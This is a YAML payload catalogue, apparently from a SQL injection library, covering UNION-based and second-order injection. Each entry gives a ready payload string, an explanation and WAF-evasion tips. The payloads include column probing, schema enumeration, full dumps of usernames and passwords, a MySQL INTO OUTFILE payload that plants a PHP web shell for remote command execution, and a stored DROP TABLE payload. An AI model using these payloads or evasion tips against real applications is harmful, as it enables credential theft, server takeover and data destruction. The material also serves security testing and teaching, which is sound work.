- slug: union-based
  name: UNION-Based SQL Injection
  description: Uses UNION SELECT statements to append attacker-controlled query results to the original query, directly embedding
    extracted data in the application response.
  difficulty: low
  prerequisites:
  - Query results are displayed in the application response
  - Number of columns in original query known or determinable
  - Data types are compatible between original and injected queries
  payloads:
  - id: sqli-union-001
    title: Column count determination with ORDER BY
    payload_string: ''' ORDER BY 1 --'
    how_it_works: 'Before executing a UNION SELECT, the attacker must determine the number of columns in the original query.
      The ORDER BY technique increments the column index until the database returns an error (column index out of range).
      If ORDER BY 3 succeeds but ORDER BY 4 returns an error, the original query has 3 columns. This is a prerequisite for
      UNION injection and can be performed silently without UNION SELECT. The ORDER BY approach is often less detected than
      NULL column probing.

      '
    prerequisites:
    - ORDER BY not blocked in injection context
    - Error messages returned for invalid column index
    waf_bypass_notes: ORDER BY technique is quieter than UNION NULL probing
    severity_context: CVSS 5.3 – column count enumeration for UNION attack setup
    cve_refs:
    - CVE-2014-3704
    tags:
    - union-based
    - column-count
    - order-by
    - reconnaissance
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: sqli-union-002
    title: UNION SELECT NULL column probe
    payload_string: ''' UNION SELECT NULL,NULL,NULL --'
    how_it_works: 'The UNION SELECT NULL technique probes for the correct number of columns. NULL is type-compatible with
      any column type, avoiding type mismatch errors. An attacker starts with one NULL and adds more until no error occurs,
      indicating the correct column count. Once found, individual NULLs are replaced with data-extracting expressions. This
      is the most reliable column count technique because it avoids ORDER BY restrictions in some contexts (e.g., queries
      with UNION already).

      '
    prerequisites:
    - UNION SELECT not blocked
    - Application returns query results in response
    waf_bypass_notes: UNION SELECT is heavily WAF-targeted; use URL encoding and whitespace
    severity_context: CVSS 5.3 – NULL-based column count determination
    cve_refs:
    - CVE-2014-3704
    tags:
    - union-based
    - null-probe
    - column-count
    - type-compatible
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: sqli-union-003
    title: UNION SELECT version extraction
    payload_string: ''' UNION SELECT NULL,version(),NULL --'
    how_it_works: 'Once the column count is known (3 in this example), individual NULLs are replaced with SQL expressions.
      The version() function returns the database version string which appears in the application''s response at the position
      of the second column. Knowing the exact database version guides subsequent exploitation: specific version bugs, function
      availability, and compatibility of attack techniques all depend on the version. This is the first data extraction payload
      after establishing column count.

      '
    prerequisites:
    - 3-column query result
    - String column in the second position
    - Application reflects query results
    waf_bypass_notes: Replace version() with other functions; use -- - comment style
    severity_context: CVSS 7.5 – version disclosure leading to targeted exploitation
    cve_refs:
    - CVE-2017-8917
    tags:
    - union-based
    - version-disclosure
    - mysql
    - data-extraction
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: sqli-union-004
    title: UNION schema enumeration
    payload_string: ''' UNION SELECT table_name,NULL,NULL FROM information_schema.tables --'
    how_it_works: 'information_schema.tables is a standard metadata view in MySQL, MSSQL, and PostgreSQL that lists all tables
      in the database. By UNIONing with a SELECT from this view, the attacker retrieves table names from the current database.
      This reveals the database schema structure, identifying tables of interest like ''users'', ''credentials'', ''orders'',
      or ''admin''. Schema enumeration is a critical step in focused data theft, allowing the attacker to identify exactly
      which tables to target.

      '
    prerequisites:
    - Access to information_schema (MySQL, MSSQL, PostgreSQL)
    - Correct column count matched
    waf_bypass_notes: information_schema is a known WAF keyword; use /*!information_schema*/
    severity_context: CVSS 7.5 – full database schema enumeration via information_schema
    cve_refs:
    - CVE-2017-8917
    tags:
    - union-based
    - schema-enumeration
    - information_schema
    - reconnaissance
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: sqli-union-005
    title: UNION credential extraction
    payload_string: ''' UNION SELECT username,password,NULL FROM users --'
    how_it_works: 'After identifying the users table via schema enumeration, this payload directly extracts usernames and
      password hashes into the application''s response. The credentials appear in place of the normal query results. Depending
      on the application''s authentication mechanism, these may be plaintext passwords, MD5/SHA1/bcrypt hashes, or tokens.
      Hashes are cracked offline using tools like Hashcat or John the Ripper. This directly leads to account takeover for
      all application users.

      '
    prerequisites:
    - users table identified with username/password columns
    - Correct column count
    waf_bypass_notes: Direct data query; combine with base64 encoding for obfuscation
    severity_context: CVSS 9.1 – full credential database dump via UNION injection
    cve_refs:
    - CVE-2014-3704
    tags:
    - union-based
    - credential-extraction
    - account-takeover
    - high-impact
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: sqli-union-006
    title: MySQL UNION into outfile
    payload_string: ''' UNION SELECT ''<?php system($_GET["cmd"]); ?>'' INTO OUTFILE ''/var/www/html/shell.php'' --'
    how_it_works: 'MySQL''s SELECT ... INTO OUTFILE writes query results to a file on the server''s filesystem. If the MySQL
      user has FILE privilege and the web server directory is writable by the MySQL process, this payload writes a PHP web
      shell to the web root. The attacker can then access the shell via HTTP to execute arbitrary OS commands. This escalates
      SQL injection to Remote Code Execution (RCE). The secure_file_priv system variable must not restrict the target path.

      '
    prerequisites:
    - MySQL with FILE privilege on database user
    - Web server document root writable by MySQL process
    - secure_file_priv is empty or includes target path
    waf_bypass_notes: INTO OUTFILE is highly blocked; use hex encoding for path and shell
    severity_context: CVSS 9.8 – SQLi to web shell via MySQL file write
    cve_refs: []
    tags:
    - union-based
    - file-write
    - webshell
    - rce
    - mysql
    - privilege-abuse
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: sqli-union-007
    title: UNION with type coercion
    payload_string: ''' UNION SELECT 1,2,3 FROM dual --'
    how_it_works: 'When the original query uses integer columns, string injections like version() cause type mismatch errors.
      Using integer literals (1, 2, 3) in the UNION SELECT confirms column count and identifies which columns are displayed
      in the response (those that appear as ''1'', ''2'', or ''3''). The dual table (Oracle, or a virtual table in MySQL)
      is used when a FROM clause is required. This technique identifies display columns before replacing integers with string-returning
      functions.

      '
    prerequisites:
    - Integer or mixed-type columns in original query
    - Application displays at least one column value
    waf_bypass_notes: Integer literals are less detected than function calls
    severity_context: CVSS 5.3 – display column identification via integer UNION
    cve_refs: []
    tags:
    - union-based
    - type-coercion
    - display-column
    - integer-probe
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: sqli-union-008
    title: UNION concatenate multiple values
    payload_string: ''' UNION SELECT concat(username,0x3a,password),NULL FROM users --'
    how_it_works: 'When only one column is displayed in the response, CONCAT combines multiple values with a delimiter (0x3a
      = colon '':'') into a single string. This retrieves both username and password in one column, working around single-column
      display limitations. GROUP_CONCAT can retrieve all rows in a single query result. CONCAT is standard in MySQL; || is
      used in PostgreSQL and Oracle; + in MSSQL. This maximizes data extraction from single-column display contexts.

      '
    prerequisites:
    - Only one display column available
    - MySQL (concat syntax)
    waf_bypass_notes: concat() is WAF-known; use char() with separate concat, or hex delimiters
    severity_context: CVSS 8.5 – multi-value extraction through single display column
    cve_refs: []
    tags:
    - union-based
    - concat
    - single-column
    - credential-extraction
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: sqli-union-009
    title: UNION GROUP_CONCAT all rows
    payload_string: ''' UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),NULL,NULL FROM users --'
    how_it_works: 'GROUP_CONCAT aggregates all rows into a single string, allowing extraction of the entire users table in
      one request. The 0x0a (newline) separator makes the output human-readable. Without GROUP_CONCAT, multiple requests would
      be needed to paginate through rows. The default GROUP_CONCAT max length is 1024 bytes; for large tables, set @@group_concat_max_len
      higher (requires appropriate privileges). This is the most efficient single-request credential dump technique in MySQL.

      '
    prerequisites:
    - MySQL or MariaDB
    - At least one display column in query
    waf_bypass_notes: GROUP_CONCAT is MySQL-specific; hex-encode separator to evade WAF
    severity_context: CVSS 9.1 – full user table dump in single request
    cve_refs: []
    tags:
    - union-based
    - group_concat
    - full-dump
    - single-request
    - efficient
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: sqli-union-010
    title: Oracle UNION without FROM
    payload_string: ''' UNION SELECT NULL,NULL FROM DUAL --'
    how_it_works: 'Oracle requires a FROM clause in every SELECT statement, unlike MySQL which allows SELECT without FROM.
      Oracle provides the DUAL dummy table for this purpose. Knowing this syntax difference is essential for Oracle-specific
      UNION injection. After confirming the column count with DUAL, subsequent UNION selects target ALL_TABLES, USER_TABLES,
      and ALL_COLUMNS for schema enumeration instead of information_schema which Oracle does not have.

      '
    prerequisites:
    - Oracle Database
    - DUAL table accessible (always available in Oracle)
    waf_bypass_notes: Oracle-specific syntax; generic SQLi payloads may fail
    severity_context: CVSS 7.5 – Oracle UNION injection setup via DUAL table
    cve_refs: []
    tags:
    - union-based
    - oracle
    - dual-table
    - database-specific
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
- slug: second-order
  name: Second-Order SQL Injection
  description: Input is stored safely on first use but later retrieved and incorporated into a SQL query without sanitization,
    with a time delay between injection and execution.
  difficulty: high
  prerequisites:
  - Application stores user input in database
  - Stored input later used in SQL query without parameterization
  - Attacker can trigger the vulnerable code path
  payloads:
  - id: sqli-2ord-001
    title: Username change second-order
    payload_string: admin'--
    how_it_works: 'An attacker registers with the username "admin''--". The registration safely stores this value (INSERT
      with parameterization). When the user later changes their password, the application retrieves the stored username and
      uses it in an UPDATE query without parameterization: UPDATE users SET password=''X'' WHERE username=''admin''--''. The
      double-dash comments out the password check, and the UPDATE applies to the admin user''s account rather than the attacker''s.
      This grants the attacker control of the admin password.

      '
    prerequisites:
    - Username stored and later used in non-parameterized UPDATE
    - Attacker can register arbitrary usernames
    waf_bypass_notes: Stored at write time; WAF inspection at write may not catch injection effect
    severity_context: CVSS 8.8 – admin password takeover via second-order SQLi in password change
    cve_refs:
    - CVE-2014-2972
    tags:
    - second-order
    - username-injection
    - password-change
    - account-takeover
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: sqli-2ord-002
    title: Profile field second-order in report
    payload_string: ''' UNION SELECT username,password FROM users --'
    how_it_works: 'An attacker stores a UNION SELECT payload in a profile field such as first name or company. When an admin
      or report generator uses this profile data in a SQL query (e.g., SELECT * FROM orders WHERE customer_name=''[stored_value]''),
      the UNION injects extra rows. The report may display extracted data alongside expected results. Second-order injection
      in reporting systems is particularly dangerous because the trigger (report generation) may occur automatically on a
      schedule, affecting multiple users'' reports.

      '
    prerequisites:
    - Profile data used in report-generating SQL query
    - Report output visible to attacker or admin
    waf_bypass_notes: Two-stage attack; injection stored as clean data; fired on report generation
    severity_context: CVSS 8.5 – second-order UNION injection in reporting system
    cve_refs:
    - CVE-2014-2972
    tags:
    - second-order
    - profile-field
    - report-injection
    - union
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: sqli-2ord-003
    title: Email field second-order in password reset
    payload_string: attacker@evil.com'||(SELECT password FROM users LIMIT 1)||'@evil.com
    how_it_works: 'The attacker registers with an email address containing SQL. During password reset, the application queries
      by email address without parameterization. The concatenation operators (||) append the first user''s password to the
      attacker''s email domain in the WHERE clause, effectively including the admin password in the query comparison string.
      Depending on the query behavior, this can bypass email validation or leak the password in error messages. Second-order
      injection in authentication flows is a severe vector.

      '
    prerequisites:
    - Email stored and used in non-parameterized password reset query
    - PostgreSQL or Oracle (uses || concatenation)
    waf_bypass_notes: Email addresses are rarely sanitized for SQL injection
    severity_context: CVSS 8.8 – second-order SQLi in password reset via email field
    cve_refs:
    - CVE-2014-2972
    tags:
    - second-order
    - email-field
    - password-reset
    - concatenation
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: sqli-2ord-004
    title: Stored address in shipping query
    payload_string: 123 Main St'; DROP TABLE orders; --
    how_it_works: 'Address fields are typically stored with parameterized queries but may be later used in dynamically constructed
      queries for reporting, shipping label generation, or order fulfillment systems. If the stored address contains SQL metacharacters
      and the downstream system is vulnerable, a DROP TABLE or other destructive operation executes. This demonstrates that
      SQL injection can have delayed destructive impact and that second-order injection can affect entirely different application
      components from where the data was entered.

      '
    prerequisites:
    - Address stored safely but used in dynamic SQL in downstream system
    - Downstream system allows DDL operations
    waf_bypass_notes: Destructive payload; would fire in downstream fulfillment system
    severity_context: CVSS 9.1 – destructive second-order DDL injection in order processing
    cve_refs: []
    tags:
    - second-order
    - address-field
    - drop-table
    - destructive
    - ddl
